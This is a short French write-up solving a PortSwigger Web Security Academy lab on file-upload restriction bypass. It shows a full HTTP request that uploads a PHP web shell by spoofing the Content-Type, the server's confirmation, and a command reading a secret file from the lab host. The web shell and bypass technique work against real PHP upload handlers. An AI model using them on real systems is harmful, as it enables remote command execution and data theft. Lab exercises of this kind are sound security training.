# Lab

https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

## Solution

On peut upload un fichier php en changeant le content-type de la requête.

```http
POST /my-account/avatar HTTP/2
Host: 0a9200ff0373610383c2974d00a3001a.web-security-academy.net
Cookie: session=KvjjIaBBDrHo6oIK62dxTkrK9DZKPz2F
Content-Length: 745
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a9200ff0373610383c2974d00a3001a.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6BhPUzcn18VSZvdB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9200ff0373610383c2974d00a3001a.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

------WebKitFormBoundary6BhPUzcn18VSZvdB
Content-Disposition: form-data; name="avatar"; filename="simple.php"
Content-Type: application/octet-stream

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2&<1');
    }
?>
</pre>
</body>
</html>
------WebKitFormBoundary6BhPUzcn18VSZvdB
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary6BhPUzcn18VSZvdB
Content-Disposition: form-data; name="csrf"

CRvnoD2DCDOuzUZ6WHOZzKWbbiJRmWfJ
------WebKitFormBoundary6BhPUzcn18VSZvdB--
```

Le shell est bien upload avec le `Content-Type: image/jpeg` :

```html
The file avatars/simple.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

Maintenant on accède au shell et on exécute :

```bash
$~ cat /home/carlos/secret
$~ jIhEBwCJT01IG7ZV0VKfSoDIB42z8fls
```